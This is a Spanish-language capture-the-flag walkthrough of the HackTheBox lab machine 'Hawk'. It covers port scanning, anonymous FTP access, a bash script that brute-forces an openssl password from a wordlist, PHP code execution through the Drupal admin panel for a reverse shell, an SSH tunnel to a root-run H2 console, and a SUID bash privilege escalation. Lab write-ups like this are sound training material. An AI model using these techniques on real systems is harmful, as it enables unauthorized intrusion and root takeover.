# Hawk

## Información

La máquina a comprometer es **Hawk** de **HackTheBox**.

![](/.gitbook/assets/Hawk.png)

## Enumeración

Comprobamos que la máquina este activa:
```bash

┌──(kali㉿kali)-[~/HTB/Hawk]
└─$ ping -c 1 10.10.10.102
PING 10.10.10.102 (10.10.10.102) 56(84) bytes of data.
64 bytes from 10.10.10.102: icmp_seq=1 ttl=63 time=111 ms

--- 10.10.10.102 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 110.576/110.576/110.576/0.000 ms

```

Vemos por la TTL que estamos ante una maquina Linux.

Realizamos un escaneo.

```bash
┌──(kali㉿kali)-[~/HTB/Hawk]
└─$ sudo nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.102 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-19 15:45 EST
Initiating SYN Stealth Scan at 15:45
Scanning 10.10.10.102 [65535 ports]
Discovered open port 21/tcp on 10.10.10.102
Discovered open port 80/tcp on 10.10.10.102
Discovered open port 22/tcp on 10.10.10.102
Discovered open port 5435/tcp on 10.10.10.102
Discovered open port 9092/tcp on 10.10.10.102
Discovered open port 8082/tcp on 10.10.10.102
Completed SYN Stealth Scan at 15:46, 16.48s elapsed (65535 total ports)
Nmap scan report for 10.10.10.102
Host is up, received user-set (0.12s latency).
Scanned at 2024-01-19 15:45:45 EST for 17s
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE         REASON
21/tcp   open  ftp             syn-ack ttl 63
22/tcp   open  ssh             syn-ack ttl 63
80/tcp   open  http            syn-ack ttl 63
5435/tcp open  sceanics        syn-ack ttl 63
8082/tcp open  blackice-alerts syn-ack ttl 63
9092/tcp open  XmlIpcRegSvc    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 16.57 seconds
           Raw packets sent: 80988 (3.563MB) | Rcvd: 79756 (3.190MB)

```

Realizamos ahora un escaneo mas minucioso:

```bash
┌──(kali㉿kali)-[~/HTB/Hawk]
└─$ nmap -sCV -p21,22,80,5435,8082,9092 10.10.10.102 -oN targeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-19 15:46 EST
Nmap scan report for 10.10.10.102
Host is up (0.11s latency).

PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.35
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Jun 16  2018 messages
22/tcp   open  ssh           OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e4:0c:cb:c5:a5:91:78:ea:54:96:af:4d:03:e4:fc:88 (RSA)
|   256 95:cb:f8:c7:35:5e:af:a9:44:8b:17:59:4d:db:5a:df (ECDSA)
|_  256 4a:0b:2e:f7:1d:99:bc:c7:d3:0b:91:53:b9:3b:e2:79 (ED25519)
80/tcp   open  http          Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Welcome to 192.168.56.103 | 192.168.56.103
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-generator: Drupal 7 (http://drupal.org)
5435/tcp open  tcpwrapped
8082/tcp open  http          H2 database http console
|_http-title: H2 Console
9092/tcp open  XmlIpcRegSvc?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9092-TCP:V=7.94SVN%I=7%D=1/19%Time=65AADFA3%P=x86_64-pc-linux-gnu%r
SF:(NULL,45E,"\0\0\0\0\0\0\0\x05\x009\x000\x001\x001\x007\0\0\0F\0R\0e\0m\
SF:0o\0t\0e\0\x20\0c\0o\0n\0n\0e\0c\0t\0i\0o\0n\0s\0\x20\0t\0o\0\x20\0t\0h
SF:\0i\0s\0\x20\0s\0e\0r\0v\0e\0r\0\x20\0a\0r\0e\0\x20\0n\0o\0t\0\x20\0a\0
SF:l\0l\0o\0w\0e\0d\0,\0\x20\0s\0e\0e\0\x20\0-\0t\0c\0p\0A\0l\0l\0o\0w\0O\
SF:0t\0h\0e\0r\0s\xff\xff\xff\xff\0\x01`\x05\0\0\x01\xd8\0o\0r\0g\0\.\0h\x
SF:002\0\.\0j\0d\0b\0c\0\.\0J\0d\0b\0c\0S\0Q\0L\0E\0x\0c\0e\0p\0t\0i\0o\0n
SF:\0:\0\x20\0R\0e\0m\0o\0t\0e\0\x20\0c\0o\0n\0n\0e\0c\0t\0i\0o\0n\0s\0\x2
SF:0\0t\0o\0\x20\0t\0h\0i\0s\0\x20\0s\0e\0r\0v\0e\0r\0\x20\0a\0r\0e\0\x20\
SF:0n\0o\0t\0\x20\0a\0l\0l\0o\0w\0e\0d\0,\0\x20\0s\0e\0e\0\x20\0-\0t\0c\0p
SF:\0A\0l\0l\0o\0w\0O\0t\0h\0e\0r\0s\0\x20\0\[\x009\x000\x001\x001\x007\0-
SF:\x001\x009\x006\0\]\0\n\0\t\0a\0t\0\x20\0o\0r\0g\0\.\0h\x002\0\.\0m\0e\
SF:0s\0s\0a\0g\0e\0\.\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0g\0e\0t\0J\0d\
SF:0b\0c\0S\0Q\0L\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\(\0D\0b\0E\0x\0c\0e\0p\0t\0
SF:i\0o\0n\0\.\0j\0a\0v\0a\0:\x003\x004\x005\0\)\0\n\0\t\0a\0t\0\x20\0o\0r
SF:\0g\0\.\0h\x002\0\.\0m\0e\0s\0s\0a\0g\0e\0\.\0D\0b\0E\0x\0c\0e\0p\0t\0i
SF:\0o\0n\0\.\0g\0e\0t\0\(\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0j\0a\0v\0
SF:a\0:\x001\x007\x009\0\)\0\n\0\t\0a\0t\0\x20\0o\0r\0g\0\.\0h\x002\0\.\0m
SF:\0e\0s\0s\0a\0g\0e\0\.\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0g\0e\0t\0\
SF:(\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0j\0a\0v\0a\0:\x001\x005\x005\0\
SF:)\0\n\0\t\0a\0t\0\x20\0o\0r\0g\0\.\0h\x002\0\.\0m\0e\0s\0s\0a\0g\0e\0\.
SF:\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0g\0e\0t\0\(\0D\0b\0E\0x\0c\0e\0p
SF:\0t\0i\0o\0n\0\.\0j\0a\0v\0a\0:\x001\x004\x004\0\)\0\n\0\t\0a\0t\0\x20\
SF:0o\0r");
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.45 seconds

```

Vemos que tenemos un FTP con acceso anónimo. Nos conectamos.

```bash
┌──(kali㉿kali)-[~/HTB/Hawk]
└─$ ftp 10.10.10.102                   
Connected to 10.10.10.102.
220 (vsFTPd 3.0.3)
Name (10.10.10.102:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||48993|)
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Jun 16  2018 .
drwxr-xr-x    3 ftp      ftp          4096 Jun 16  2018 ..
drwxr-xr-x    2 ftp      ftp          4096 Jun 16  2018 messages
226 Directory send OK.
ftp> cd messages
250 Directory successfully changed.
ftp> ls -la
229 Entering Extended Passive Mode (|||40730|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Jun 16  2018 .
drwxr-xr-x    3 ftp      ftp          4096 Jun 16  2018 ..
-rw-r--r--    1 ftp      ftp           240 Jun 16  2018 .drupal.txt.enc
226 Directory send OK.
ftp> get .drupal.txt.enc
local: .drupal.txt.enc remote: .drupal.txt.enc
229 Entering Extended Passive Mode (|||41627|)
150 Opening BINARY mode data connection for .drupal.txt.enc (240 bytes).
100% |********************************************************************************************************************************************|   240        5.32 MiB/s    00:00 ETA
226 Transfer complete.
240 bytes received in 00:00 (2.09 KiB/s)
ftp> cat .drupal.txt.enc
?Invalid command.
ftp> exit
221 Goodbye.
                                                                                                                                                                                         
┌──(kali㉿kali)-[~/HTB/Hawk]
└─$ cat .drupal.txt.enc        
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: .drupal.txt.enc
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ U2FsdGVkX19rWSAG1JNpLTawAmzz/ckaN1oZFZewtIM+e84km3Csja3GADUg2jJb
   2   │ CmSdwTtr/IIShvTbUd0yQxfe9OuoMxxfNIUN/YPHx+vVw/6eOD+Cc1ftaiNUEiQz
   3   │ QUf9FyxmCb2fuFoOXGphAMo+Pkc2ChXgLsj4RfgX+P7DkFa8w1ZA9Yj7kR+tyZfy
   4   │ t4M0qvmWvMhAj3fuuKCCeFoXpYBOacGvUHRGywb4YCk=
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
                                                                                                                                                                                         
┌──(kali㉿kali)-[~/HTB/Hawk]
└─$ 
```
Observamos que hay un fichero en base 64. Lo decodificamos.

```bash
┌──(kali㉿kali)-[~/HTB/Hawk]
└─$ cat .drupal.txt.enc | tr -d '\n'
U2FsdGVkX19rWSAG1JNpLTawAmzz/ckaN1oZFZewtIM+e84km3Csja3GADUg2jJbCmSdwTtr/IIShvTbUd0yQxfe9OuoMxxfNIUN/YPHx+vVw/6eOD+Cc1ftaiNUEiQzQUf9FyxmCb2fuFoOXGphAMo+Pkc2ChXgLsj4RfgX+P7DkFa8w1ZA9Yj7kR+tyZfyt4M0qvmWvMhAj3fuuKCCeFoXpYBOacGvUHRGywb4YCk=                                                                                                                                                                                         
┌──(kali㉿kali)-[~/HTB/Hawk]
└─$ cat .drupal.txt.enc | tr -d '\n' | base64 -d > drupal.enc    
                                                                                                                                                                                         
┌──(kali㉿kali)-[~/HTB/Hawk]
└─$ file drupa      
drupa: cannot open `drupa' (No such file or directory)
                                                                                                                                                                                         
┌──(kali㉿kali)-[~/HTB/Hawk]
└─$ file drupal.enc 
drupal.enc: openssl enc'd data with salted password
```

Comprobamos que es un fichero encriptado con **openssl**.

Para desencriptar el fichero hay que averiguar la password de encriptación. Existe una utilidad, **openssl-bruteforce**, que lo hace.

![](/.gitbook/assets/hawk1.png)

Tambien podemos programar un script que lo haga:

```bash
┌──(kali㉿kali)-[~/HTB/Hawk]
└─$ catn decripter.sh
#!/bin/bash

function ctrl_c(){
    echo -e "\n\n[!] Saliendo...\n"
    tput tnorm
    exit1
}

# Ctlr+C
trap ctrl_c INT

tput civis; for password in $(cat /usr/share/wordlists/rockyou.txt); do
    openssl aes-256-cbc -d -in drupal.enc -out drupal.decripted -pass pass:$password &>/dev/null

    if [ "$(echo $?)" == "0" ]; then
        echo -e "\n[+] La password es $password\n"
        tput cnorm; exit 0
    fi
done; tput cnorm
```
Y lo lanzamos:

```bash
┌──(kali㉿kali)-[~/HTB/Hawk]
└─$ ./decripter.sh   

[+] La password es friends

```

Nos ha creado el fichero drupal.decripted:

```bash
┌──(kali㉿kali)-[~/HTB/Hawk]
└─$ catn drupal.decripted
Daniel,

Following the password for the portal:

PencilKeyboardScanner123

Please let us know when the portal is ready.

Kind Regards,

IT department
```

Tenemos un usuario, Daniel, y una contraseña. Entramos pues al portal por el puerto 80.

Probamos con el usuario daniel y la password, pero no existe ee usuario:

![](/.gitbook/assets/hawk2.png)

Probamos con el usuario admin y la contraseña y si entramos:

![](/.gitbook/assets/hawk3.png)

## Explotación

Para ganar acceso primero configuramos la interpretación PHP en drupal.

![](/.gitbook/assets/hawk4.png)

Volvemos a home y pulsamos en new content. Previemente nos creamos un fichero index.html con el contenido de la console reversa y levantamos un servicio http. Nos ponemos a la escucha:

![](/.gitbook/assets/hawk6.png)

Y en el nuevo contenido ejecutamos la llamada:

![](/.gitbook/assets/hawk7.png)

Pulsamos en preview y obtenemos acceso.

```bash
┌──(kali㉿kali)-[~/HTB/Hawk]
└─$ sudo nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.54] from (UNKNOWN) [10.10.10.102] 42236
bash: cannot set terminal process group (903): Inappropriate ioctl for device
bash: no job control in this shell
www-data@hawk:/var/www/html$ 
```

## Escalada de privilegios

Para la escalada vamos a tirar del servicio H2 corriendo en el puerto 8082. El problema es que no nos deja entrar de forma remota.

![](/.gitbook/assets/hawk8.png)


Como estamos dentro de la máquina podemos ver que el proceso H2 es de root. Por tanto, si logramos ejecutar comandos con este proceso habrémos escalado. 

![](/.gitbook/assets/hawk10.png)

Necesitamos una credencial para poder crear un tunel SSH y hacer creer a la máquina que el acceso es local. Buscamos en los ficheros PHP de drupal y encontramos una password.


![](/.gitbook/assets/hawk9.png)

La usamos con el usuario daniel y nos devuelve una consola python:

```bash
www-data@hawk:/var/www/html$ su daniel
Password: 
Python 3.6.5 (default, Apr  1 2018, 05:46:30) 
[GCC 7.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> os.system("/bin/bash")
daniel@hawk:/var/www/html$ 
daniel@hawk:/var/www/html$ id
uid=1002(daniel) gid=1005(daniel) groups=1005(daniel)
daniel@hawk:/var/www/html$ 
```

Al tener credenciales podemos crear un tunel a la máquina y nos tramemos el puerto 8082.

```bash
┌──(kali㉿kali)-[~/HTB/Hawk]
└─$ ssh daniel@10.10.10.102 -L 8082:127.0.0.1:8082
daniel@10.10.10.102's password: 
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-23-generic x86_64)

```

Y accedemos por localhost:

![](/.gitbook/assets/hawk11.png)

![](/.gitbook/assets/hawk12.png)

Buscamos una opción de ejecución de comandos:


![](/.gitbook/assets/hawk13.png)

La probamos:


![](/.gitbook/assets/hawk14.png)

Podemos cambiar el permiso SUID de la bash:

![](/.gitbook/assets/hawk15.png)

Y convertirnos en root:

```bash
bash-4.4$ id
uid=1002(daniel) gid=1005(daniel) groups=1005(daniel)
bash-4.4$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1113504 Apr  4  2018 /bin/bash
bash-4.4$ whoami
daniel
bash-4.4$ bash -p
bash-4.4# whoami
root
bash-4.4# 

```